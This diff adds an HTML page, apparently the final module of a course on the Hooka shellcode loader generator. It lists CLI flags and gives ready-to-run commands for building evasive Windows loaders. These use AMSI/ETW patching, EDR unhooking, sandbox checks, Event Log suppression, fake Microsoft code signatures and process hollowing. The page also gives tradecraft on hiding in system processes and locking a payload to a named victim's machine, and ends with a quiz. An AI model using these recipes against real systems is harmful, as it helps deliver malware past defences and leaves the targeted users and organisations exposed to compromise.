@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 8: CLI Generator &amp; Full Chain - Hooka Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1FA9D;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#4ade80;--accent2:#2dd4bf;--gradient:linear-gradient(135deg,#4ade80,#2dd4bf)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Hooka Course</h2>
+<span>Shellcode Loader Generator</span>
+</div>
+<a class="home-link" href="../Hooka_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Introduction to Shellcode Loaders</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Injection Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Syscalls &amp; Gate Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Unhooking &amp; Patching</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Sandbox Detection &amp; Process Protection</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Encryption &amp; Obfuscation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. The Hooka Go Library</span><span class="diff d3">d3</span></a>
+<a class="mod-link active" href="module8.html"><span>8. CLI Generator &amp; Full Chain</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 8: CLI Generator &amp; Full Chain</h1>
+<p class="subtitle">The complete Hooka CLI reference, real-world loader recipes, end-to-end execution flow, and operational tradecraft for the final module.</p>
+
+<div class="card highlight">
+<h4>The Big Picture</h4>
+<p>Throughout this course you have learned each individual technique: injection methods, syscall gates, unhooking, AMSI/ETW patching, sandbox detection, encryption, and the Go library. The Hooka CLI brings them all together into a single command-line tool that generates complete, ready-to-compile loaders. This final module covers the CLI in depth, walks through real-world loader recipes, explains the end-to-end generation pipeline, and closes with operational tradecraft and a full course recap.</p>
+</div>
+
+<!-- ==================== SECTION 1: Installation ==================== -->
+<h2>Installation</h2>
+<pre><span class="lang-tag">Bash</span># Clone the repository
+git clone https://github.com/D3Ext/Hooka
+cd Hooka
+
+# Build (outputs to build/ directory)
+make
+
+# The hooka binary is now at build/hooka</pre>
+
+<div class="card">
+<h4>Build Output</h4>
+<p>The <code>make</code> target compiles the Hooka CLI tool and places it in the <code>build/</code> directory. The binary itself is a standard Go executable that runs on Linux (the primary build environment for cross-compiling Windows loaders). It uses <code>GOOS=windows GOARCH=amd64</code> flags internally when generating loaders.</p>
+</div>
+
+<!-- ==================== SECTION 2: Input Sources ==================== -->
+<h2>Input Sources</h2>
+<p>Hooka accepts shellcode from multiple input formats via the <code>-i</code> flag:</p>
+
+<table>
+<tr><th>Input Type</th><th>Extension / Pattern</th><th>How It's Handled</th></tr>
+<tr><td>Raw shellcode</td><td><code>.bin</code></td><td>Read directly as bytes &mdash; no conversion needed</td></tr>
+<tr><td>PE executable</td><td><code>.exe</code></td><td>Converted to shellcode using PE-to-shellcode techniques (similar to Donut)</td></tr>
+<tr><td>DLL</td><td><code>.dll</code></td><td>Converted via sRDI (ConvertDllToShellcode) to reflective shellcode</td></tr>
+<tr><td>Remote URL</td><td><code>http://...</code></td><td>Fetched at build time and processed based on content type</td></tr>
+</table>
+
+<div class="card">
+<h4>Output Formats</h4>
+<table>
+<tr><th>Flag</th><th>Format</th><th>Description</th></tr>
+<tr><td><code>-f exe</code> (default)</td><td>EXE</td><td>Standard Windows executable &mdash; double-click or command-line execution</td></tr>
+<tr><td><code>-f dll</code></td><td>DLL</td><td>Windows DLL with entry point &mdash; loaded via rundll32 or side-loading</td></tr>
+</table>
+</div>
+
+<!-- ==================== SECTION 3: Complete CLI Reference ==================== -->
+<h2>Complete CLI Flag Reference</h2>
+
+<table>
+<tr><th>Flag</th><th>Long Form</th><th>Description</th></tr>
+<tr><td><code>-i</code></td><td><code>--input</code></td><td>Input file path or URL (required)</td></tr>
+<tr><td><code>-o</code></td><td><code>--output</code></td><td>Output file path (default: loader.exe)</td></tr>
+<tr><td><code>-f</code></td><td><code>--format</code></td><td>Output format: <code>exe</code> or <code>dll</code></td></tr>
+<tr><td></td><td><code>--exec</code></td><td>Injection technique (SuspendedProcess, ProcessHollowing, NtCreateThreadEx, EnumCalcProc, CreateFiber, QueueUserApc, CreateRemoteThread, NoRwx)</td></tr>
+<tr><td></td><td><code>--unhook</code></td><td>Unhooking method: <code>classic</code>, <code>full</code>, or <code>peruns</code></td></tr>
+<tr><td></td><td><code>--amsi</code></td><td>Enable AMSI patching</td></tr>
+<tr><td></td><td><code>--etw</code></td><td>Enable ETW patching</td></tr>
+<tr><td></td><td><code>--halo</code></td><td>Use Halo's Gate for syscall resolution</td></tr>
+<tr><td></td><td><code>--sandbox</code></td><td>Enable all 9 sandbox detection checks</td></tr>
+<tr><td></td><td><code>--sleep</code></td><td>Add custom sleep at startup</td></tr>
+<tr><td></td><td><code>--acg</code></td><td>Enable Arbitrary Code Guard</td></tr>
+<tr><td></td><td><code>--blockdlls</code></td><td>Block non-Microsoft DLLs</td></tr>
+<tr><td></td><td><code>--phantom</code></td><td>Enable Phant0m Event Log suppression</td></tr>
+<tr><td></td><td><code>--enc</code></td><td>Encryption: <code>aes</code>, <code>3des</code>, <code>rc4</code>, or <code>xor</code></td></tr>
+<tr><td></td><td><code>--sgn</code></td><td>Apply Shikata Ga Nai polymorphic encoding</td></tr>
+<tr><td></td><td><code>--strings</code></td><td>Caesar cipher string obfuscation</td></tr>
+<tr><td><code>-r</code></td><td><code>--rand</code></td><td>Randomize variable and function names</td></tr>
+<tr><td></td><td><code>--compress</code></td><td>UPX compression on output binary</td></tr>
+<tr><td><code>-c</code></td><td><code>--cert</code></td><td>PFX certificate for code signing</td></tr>
+<tr><td><code>-d</code></td><td><code>--domain</code></td><td>Domain for fake code signature</td></tr>
+<tr><td></td><td><code>--proc</code></td><td>Target process name for injection (default: notepad.exe)</td></tr>
+<tr><td></td><td><code>--user</code></td><td>Restrict execution to specific username</td></tr>
+<tr><td></td><td><code>--computername</code></td><td>Restrict execution to specific hostname</td></tr>
+<tr><td></td><td><code>--calc</code></td><td>Use built-in calc.exe shellcode for testing</td></tr>
+</table>
+
+<!-- ==================== SECTION 4: Loader Recipes ==================== -->
+<h2>Building Loaders for Real Scenarios</h2>
+
+<h3>Scenario 1: Basic Loader</h3>
+<div class="card">
+<h4>Minimal Configuration</h4>
+<pre><span class="lang-tag">Bash</span>hooka -i shellcode.bin -o loader.exe</pre>
+<p>Uses default settings: NtCreateThreadEx injection, no encryption, no evasion. Good for testing in controlled environments where no AV/EDR is present.</p>
+</div>
+
+<h3>Scenario 2: Process Hollowing with Unhooking</h3>
+<div class="card">
+<h4>Targeted Injection with EDR Bypass</h4>
+<pre><span class="lang-tag">Bash</span>hooka -i sc.bin -o loader.exe \
+  --exec ProcessHollowing \
+  --unhook full \
+  --amsi --etw</pre>
+<p>Hollows a target process (default: notepad.exe), replaces its memory with shellcode, and resumes execution. Full NTDLL unhooking removes all EDR hooks before injection. AMSI and ETW patching disable the two primary telemetry channels.</p>
+</div>
+
+<h3>Scenario 3: Remote Fetch + DLL Output</h3>
+<div class="card">
+<h4>Stageless Network-Fetched Loader</h4>
+<pre><span class="lang-tag">Bash</span>hooka -i http://192.168.1.126/sc.bin -o loader.dll \
+  -f dll --sandbox --enc aes</pre>
+<p>Fetches shellcode from a remote server at build time, encrypts it with AES, embeds the ciphertext into a DLL. The DLL performs sandbox detection before decrypting and injecting. Output can be loaded via <code>rundll32</code> or DLL side-loading.</p>
+</div>
+
+<h3>Scenario 4: Maximum Evasion</h3>
+<div class="card green">
+<h4>Every Evasion Technique Enabled</h4>
+<pre><span class="lang-tag">Bash</span>hooka -i sc.bin -o loader.exe \
+  --exec NtCreateThreadEx \
+  --unhook peruns \
+  --halo \
+  --amsi --etw \
+  --sandbox \
+  --blockdlls \
+  --phantom \
+  --sleep \
+  --acg \
+  --enc aes \
+  --sgn \
+  --strings \
+  -r \
+  --compress \
+  -d www.microsoft.com</pre>
+<p>This generates a loader with: custom sleep delay, nine sandbox checks, AMSI and ETW patching, Perun's Fart NTDLL unhooking, Halo's Gate syscall resolution, DLL blocking, ACG Guard, Event Log suppression, AES encryption with SGN encoding, Caesar cipher string obfuscation, random naming, UPX compression, and a fake Microsoft code signature.</p>
+</div>
+
+<!-- ==================== SECTION 5: Test Mode ==================== -->
+<h2>The --calc Test Mode</h2>
+<div class="card">
+<h4>Safe Testing Without Real Shellcode</h4>
+<pre><span class="lang-tag">Bash</span># Generate a loader that opens calc.exe (safe test payload)
+hooka --calc -o test_loader.exe --exec NtCreateThreadEx --sandbox</pre>
+<p>The <code>--calc</code> flag uses a built-in shellcode payload that launches <code>calc.exe</code>. This allows you to test all evasion techniques, injection methods, and sandbox detection without needing actual malicious shellcode. If calc.exe opens on the target, your loader chain works correctly.</p>
+</div>
+
+<!-- ==================== SECTION 6: End-to-End Flow ==================== -->
+<h2>End-to-End Generation Pipeline</h2>
+<p>When you run the Hooka CLI, the following pipeline executes internally:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">CLI Generation Pipeline</h4>
+<div class="flow">
+<div class="box">Parse Args<br><small>CLI flags</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Read Input<br><small>.bin/.exe/.dll/URL</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Convert<br><small>PE/DLL to shellcode</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Encrypt<br><small>AES/3DES/RC4/XOR</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Generate Go<br><small>Source code</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Obfuscate<br><small>Strings/names</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Compile<br><small>GOOS=windows</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Post-process<br><small>SGN/UPX/Sign</small></div>
+</div>
+</div>
+
+<div class="card">
+<h4>Pipeline Steps in Detail</h4>
+<ol>
+<li><strong>Parse Arguments</strong>: The CLI parses all flags and validates the configuration (incompatible options, missing dependencies like sgn or UPX).</li>
+<li><strong>Read Input</strong>: Shellcode is read from the specified file or fetched from a URL. For .exe and .dll inputs, conversion to shellcode format occurs.</li>
+<li><strong>Convert</strong>: PE executables are converted via PE-to-shellcode techniques. DLLs are converted via sRDI. Raw .bin files are used directly.</li>
+<li><strong>Encrypt</strong>: The shellcode is encrypted with the selected algorithm. A random key is generated. Both ciphertext and key are prepared for embedding.</li>
+<li><strong>Generate Go Source</strong>: Hooka generates a complete Go source file containing: the encrypted shellcode as a byte array, the decryption key, the decryption function, all selected evasion techniques in the correct order, and the injection method.</li>
+<li><strong>Obfuscate</strong>: If <code>--strings</code> is enabled, string literals are Caesar-shifted. If <code>-r</code> is enabled, all identifiers are randomized.</li>
+<li><strong>Compile</strong>: The Go source is cross-compiled with <code>GOOS=windows GOARCH=amd64</code> and linker flags <code>-s -w -H=windowsgui</code> (strip symbols, no console window).</li>
+<li><strong>Post-Process</strong>: Optional SGN encoding, UPX compression, and code signing are applied to the compiled binary.</li>
+</ol>
+</div>
+
+<!-- ==================== SECTION 7: Generated Code Structure ==================== -->
+<h2>What the Generated Code Looks Like</h2>
+<p>The generated Go source follows a strict execution order designed for maximum evasion. Here is the startup sequence that every generated loader follows:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Generated Loader Startup Sequence</h4>
+<div class="flow">
+<div class="box">Sleep<br><small>Time delay</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Sandbox<br><small>AutoCheck()</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">AMSI<br><small>PatchAmsi()</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">ETW<br><small>PatchEtw()</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Unhook<br><small>Clean NTDLL</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Decrypt<br><small>Shellcode</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Inject<br><small>Execute payload</small></div>
+</div>
+</div>
+
+<pre><span class="lang-tag">Go</span>// Pseudocode of generated loader structure
+func main() {
+    // Phase 1: Timing evasion
+    hooka.Sleep()                    // if --sleep
+
+    // Phase 2: Environment validation
+    sandbox, _ := hooka.AutoCheck()  // if --sandbox
+    if sandbox { os.Exit(0) }
+
+    // Phase 3: Defense neutralization
+    hooka.PatchAmsi()                // if --amsi
+    hooka.PatchEtw()                 // if --etw
+    hooka.PerunsUnhook()             // if --unhook peruns
+
+    // Phase 4: Process hardening
+    hooka.EnableACG()                // if --acg
+    hooka.BlockDLLs()                // if --blockdlls
+    pid, _ := hooka.GetEventLogPid() // if --phantom
+    hooka.Phant0m(pid)               // if --phantom
+
+    // Phase 5: Payload preparation
+    key := []byte{...}               // Embedded decryption key
+    enc := []byte{...}               // Embedded encrypted shellcode
+    sc := decrypt(enc, key)          // Runtime decryption
+
+    // Phase 6: Execution
+    hooka.NtCreateThreadExHalos(sc)  // Selected injection method
+}</pre>
+
+<!-- ==================== SECTION 8: DLL Output ==================== -->
+<h2>DLL Output Considerations</h2>
+<div class="card">
+<h4>DLL Format (<code>-f dll</code>)</h4>
+<p>When generating a DLL, the loader logic executes in the DLL's entry point (<code>DllMain</code>) when <code>DLL_PROCESS_ATTACH</code> is received. This means the shellcode runs automatically when the DLL is loaded by any process.</p>
+<ul>
+<li><strong>rundll32 execution</strong>: <code>rundll32.exe loader.dll,DllMain</code></li>
+<li><strong>DLL side-loading</strong>: place the DLL where a legitimate application will load it</li>
+<li><strong>Export functions</strong>: the generated DLL exports standard functions expected by common side-loading targets</li>
+</ul>
+<p>DLL format is preferred for side-loading scenarios and when you need the loader to execute within the context of another (legitimate) process.</p>
+</div>
+
+<!-- ==================== SECTION 9: Code Signing Workflow ==================== -->
+<h2>Code Signing Workflow</h2>
+<div class="card">
+<h4>Using Real and Fake Certificates</h4>
+<pre><span class="lang-tag">Bash</span># Option 1: Sign with a real PFX certificate
+hooka -i sc.bin -o loader.exe -c /path/to/cert.pfx
+
+# Option 2: Generate a fake signature with a domain name
+hooka -i sc.bin -o loader.exe -d www.microsoft.com
+
+# Combine both: sign with real cert AND compress
+hooka -i sc.bin -o loader.exe -c cert.pfx --compress</pre>
+<p>Hooka uses <code>osslsigncode</code> internally for signing. For fake signatures (<code>-d</code>), it generates a self-signed certificate with the specified Common Name, signs the binary, and embeds the certificate. The signature will appear in file properties but will not pass chain-of-trust verification.</p>
+</div>
+
+<!-- ==================== SECTION 10: Detection Surface ==================== -->
+<h2>Detection Surface Analysis</h2>
+<p>Understanding what defenders look for helps you make informed decisions about which techniques to combine.</p>
+
+<div class="card warn">
+<h4>What Defenders Detect</h4>
+<table>
+<tr><th>Detection Vector</th><th>What They Look For</th><th>Hooka's Counter</th></tr>
+<tr><td>Static signatures</td><td>Known byte patterns in the binary</td><td>Encryption + SGN encoding</td></tr>
+<tr><td>String analysis</td><td>API names, DLL names, suspicious strings</td><td><code>--strings</code> Caesar cipher</td></tr>
+<tr><td>Symbol analysis</td><td>Function/variable names in Go binaries</td><td><code>-r</code> random naming + <code>-s -w</code> linker flags</td></tr>
+<tr><td>Import table</td><td>Suspicious Win32 API imports</td><td>Halo's Gate syscalls bypass import table</td></tr>
+<tr><td>Entropy analysis</td><td>High-entropy sections (encrypted data)</td><td>Difficult to counter &mdash; inherent to encryption</td></tr>
+<tr><td>Behavioral analysis</td><td>API call sequences in sandbox</td><td><code>--sandbox</code> detection + <code>--sleep</code></td></tr>
+<tr><td>Memory scanning</td><td>Plaintext shellcode in memory post-decryption</td><td>ACG prevents post-injection scanning hooks</td></tr>
+<tr><td>Event logs</td><td>Process creation, privilege escalation events</td><td><code>--phantom</code> Event Log suppression</td></tr>
+<tr><td>EDR hooks</td><td>Inline hooks on NT functions</td><td><code>--unhook</code> NTDLL restoration</td></tr>
+<tr><td>Go binary fingerprint</td><td>Go runtime structures, GC metadata</td><td>UPX compression alters binary structure</td></tr>
+</table>
+</div>
+
+<!-- ==================== SECTION 11: Operational Tradecraft ==================== -->
+<h2>Operational Tradecraft</h2>
+
+<div class="card">
+<h4>Target Process Selection</h4>
+<p>The <code>--proc</code> flag specifies which process to target for injection techniques that require a host process (SuspendedProcess, ProcessHollowing, QueueUserApc, CreateRemoteThread). Default is <code>notepad.exe</code>.</p>
+<ul>
+<li><strong>Choose common processes</strong>: <code>svchost.exe</code>, <code>RuntimeBroker.exe</code>, <code>explorer.exe</code> blend into normal system activity</li>
+<li><strong>Match architecture</strong>: target must be x64 for x64 shellcode</li>
+<li><strong>Avoid protected processes</strong>: some system processes (csrss.exe, lsass.exe) have additional protections</li>
+</ul>
+</div>
+
+<div class="card">
+<h4>Username &amp; Hostname Targeting</h4>
+<pre><span class="lang-tag">Bash</span># Lock execution to a specific target
+hooka -i sc.bin -o loader.exe \
+  --user jsmith \
+  --computername CORP-WS-042 \
+  --sandbox</pre>
+<p>If the loader lands on an analyst's machine or a different workstation, it exits silently without revealing any behavior. Combined with sandbox detection, this provides strong environment validation.</p>
+</div>
+
+<!-- ==================== SECTION 12: CLI vs Library ==================== -->
+<h2>When to Use CLI vs Go Library</h2>
+
+<div class="versus">
+<table>
+<tr><th>Use Case</th><th>Best Tool</th><th>Why</th></tr>
+<tr><td>Quick loader for a known payload</td><td>CLI</td><td>Single command, immediate output</td></tr>
+<tr><td>Testing injection techniques</td><td>CLI + <code>--calc</code></td><td>Safe testing with calc.exe payload</td></tr>
+<tr><td>Custom encryption chains</td><td>Library</td><td>Combine multiple crypto algorithms</td></tr>
+<tr><td>C2 framework integration</td><td>Library</td><td>Programmatic control, dynamic configuration</td></tr>
+<tr><td>Conditional execution logic</td><td>Library</td><td>If-else branches, fallback strategies</td></tr>
+<tr><td>Batch loader generation</td><td>CLI (scripted)</td><td>Loop through flag combinations in bash</td></tr>
+<tr><td>Novel injection techniques</td><td>Library</td><td>Combine Hooka functions with custom code</td></tr>
+</table>
+</div>
+
+<!-- ==================== SECTION 13: Evolution ==================== -->
+<h2>Prior Art &amp; Evolution</h2>
+<p>Hooka builds on a lineage of Go-based shellcode loaders, each advancing the state of evasion:</p>
+
+<div class="card">
+<h4>The Loader Family Tree</h4>
+<table>
+<tr><th>Tool</th><th>Author</th><th>Key Innovation</th></tr>
+<tr><td>BokuLoader</td><td>boku7</td><td>Early reflective loader with syscalls</td></tr>
+<tr><td>ScareCrow</td><td>Optiv</td><td>EDR-aware loader with DLL side-loading and code signing</td></tr>
+<tr><td>Freeze</td><td>Optiv</td><td>Suspended process injection with ETW/AMSI patching</td></tr>
+<tr><td>Shhhloader</td><td>icyguider</td><td>Syscall-based loader with multiple injection methods</td></tr>
+<tr><td><strong>Hooka</strong></td><td>D3Ext</td><td>Combined all techniques + importable Go library + CLI generator with 8 injection methods, 3 gate techniques, 3 unhooking methods, 4 encryption algorithms, and 9 sandbox checks</td></tr>
+</table>
+<p>Hooka's key differentiator is its dual nature: a complete CLI tool <strong>and</strong> an importable Go library. Previous tools were CLI-only, requiring users to modify source code for customization. Hooka's library approach allows building entirely custom tooling while leveraging battle-tested evasion primitives.</p>
+</div>
+
+<!-- ==================== SECTION 14: Course Recap ==================== -->
+<h2>Course Summary: All 8 Modules</h2>
+
+<div class="card green">
+<h4>What You've Learned</h4>
+<table>
+<tr><th>Module</th><th>Topic</th><th>Key Takeaway</th></tr>
+<tr><td>1</td><td>Introduction to Shellcode Loaders</td><td>Loader lifecycle, EDR detection layers, tool landscape</td></tr>
+<tr><td>2</td><td>Injection Techniques</td><td>8 injection methods from SuspendedProcess to NoRwx</td></tr>
+<tr><td>3</td><td>Syscalls &amp; Gate Techniques</td><td>Direct syscalls, Hell's/Halo's/Tartarus' Gate, API hashing</td></tr>
+<tr><td>4</td><td>Unhooking &amp; Patching</td><td>3 unhooking methods, AMSI patching (2), ETW patching (2)</td></tr>
+<tr><td>5</td><td>Sandbox Detection &amp; Process Protection</td><td>9 sandbox checks, ACG, BlockDLLs, Phant0m, custom sleep</td></tr>
+<tr><td>6</td><td>Encryption &amp; Obfuscation</td><td>AES/3DES/RC4/XOR, SGN, string obfuscation, code signing</td></tr>
+<tr><td>7</td><td>The Hooka Go Library</td><td>40+ functions, custom loader building, sRDI, API reference</td></tr>
+<tr><td>8</td><td>CLI Generator &amp; Full Chain</td><td>Complete CLI reference, generation pipeline, tradecraft</td></tr>
+</table>
+</div>
+
+<!-- ==================== QUIZ ==================== -->
+<div class="quiz" id="quiz8">
+<h4>Final Exam: CLI Generator &amp; Full Chain</h4>
+<div class="quiz-q" data-correct="3">
+<p>Q1: What is the correct execution order in a generated Hooka loader?</p>
+<label data-opt="0"><input type="radio" name="q8_0"> Inject &rarr; Decrypt &rarr; Unhook &rarr; Sandbox check</label>
+<label data-opt="1"><input type="radio" name="q8_0"> Sandbox check &rarr; Inject &rarr; AMSI patch &rarr; Decrypt</label>
+<label data-opt="2"><input type="radio" name="q8_0"> AMSI patch &rarr; Inject &rarr; Sandbox check &rarr; ETW patch</label>
+<label data-opt="3"><input type="radio" name="q8_0"> Sleep &rarr; Sandbox check &rarr; AMSI/ETW patch &rarr; Unhook &rarr; Decrypt &rarr; Inject</label>
+<div class="explain">The correct order is: Sleep (time-based evasion), Sandbox check (exit if VM), AMSI/ETW patching (disable telemetry), Unhook NTDLL (remove EDR hooks), Decrypt shellcode, then Inject. Each step must succeed before the next for maximum evasion.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: What does the <code>--calc</code> flag do?</p>
+<label data-opt="0"><input type="radio" name="q8_1"> Calculates the optimal evasion combination</label>
+<label data-opt="1"><input type="radio" name="q8_1"> Uses built-in calc.exe shellcode as a safe test payload</label>
+<label data-opt="2"><input type="radio" name="q8_1"> Compresses the output using a calculation algorithm</label>
+<label data-opt="3"><input type="radio" name="q8_1"> Adds a calculator UI to the loader</label>
+<div class="explain">The --calc flag substitutes built-in shellcode that launches calc.exe (the Windows calculator) instead of requiring a real shellcode input file. This allows safe testing of all evasion and injection techniques. If calc.exe opens on the target, the entire loader chain is working correctly.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q3: Why does Hooka cross-compile with <code>-H=windowsgui</code>?</p>
+<label data-opt="0"><input type="radio" name="q8_2"> It makes the binary run faster on Windows</label>
+<label data-opt="1"><input type="radio" name="q8_2"> It adds a graphical user interface to the loader</label>
+<label data-opt="2"><input type="radio" name="q8_2"> It prevents the loader from opening a visible console window when executed</label>
+<label data-opt="3"><input type="radio" name="q8_2"> It enables Windows-specific optimizations</label>
+<div class="explain">The -H=windowsgui linker flag tells the Go compiler to set the PE subsystem to Windows GUI instead of Console. Without it, the loader would open a visible Command Prompt window when executed, immediately alerting the user to suspicious activity. With the flag, the loader runs silently in the background.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q4: What is Hooka's primary differentiator compared to ScareCrow, Freeze, and Shhhloader?</p>
+<label data-opt="0"><input type="radio" name="q8_3"> It provides both a CLI tool AND an importable Go library (pkg/hooka) with 40+ individual functions for building custom loaders</label>
+<label data-opt="1"><input type="radio" name="q8_3"> It supports more programming languages</label>
+<label data-opt="2"><input type="radio" name="q8_3"> It has a graphical user interface</label>
+<label data-opt="3"><input type="radio" name="q8_3"> It works on Linux and macOS targets</label>
+<div class="explain">While ScareCrow, Freeze, and Shhhloader are CLI-only tools, Hooka uniquely provides both a complete CLI generator AND an importable Go library. The library exposes 40+ individual functions that developers can compose into entirely custom loaders, enabling integration with C2 frameworks, custom encryption chains, and novel evasion techniques that a fixed CLI cannot support.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz8')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module7.html">&larr; Prev: The Hooka Go Library</a>
+<a class="primary" href="../Hooka_index.html">Back to Course Home &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
